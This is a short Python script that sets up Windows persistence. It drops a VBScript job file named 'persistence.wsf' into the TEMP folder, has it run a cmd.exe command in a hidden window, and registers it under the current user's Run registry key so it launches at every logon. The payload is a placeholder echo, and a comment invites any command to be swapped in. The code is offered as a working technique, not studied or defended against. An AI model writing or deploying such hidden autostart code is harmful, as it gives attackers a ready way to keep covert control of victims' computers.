import os

# Set the path and filename for the WScript file
wscript_path = os.path.join(os.environ['TEMP'], 'persistence.wsf')

# Create the WScript file contents
wscript_contents = '''<?xml version="1.0" encoding="UTF-16"?>
<job>
    <script language="VBScript">
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "cmd.exe /c <command to execute>", 0
    </script>
</job>
'''

# Replace '<command to execute>' with the command you want to run at startup
wscript_contents = wscript_contents.replace('<command to execute>', 'echo Hello World!')

# Write the WScript file to disk
with open(wscript_path, 'w') as f:
    f.write(wscript_contents)

# Set up persistence by creating a registry key for the WScript file
reg_key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
reg_key_name = 'Persistence'
reg_key_value = f'wscript.exe "{wscript_path}"'

import winreg as reg

reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_key_path, 0, reg.KEY_ALL_ACCESS)
reg.SetValueEx(reg_key, reg_key_name, 0, reg.REG_SZ, reg_key_value)
reg.CloseKey(reg_key)
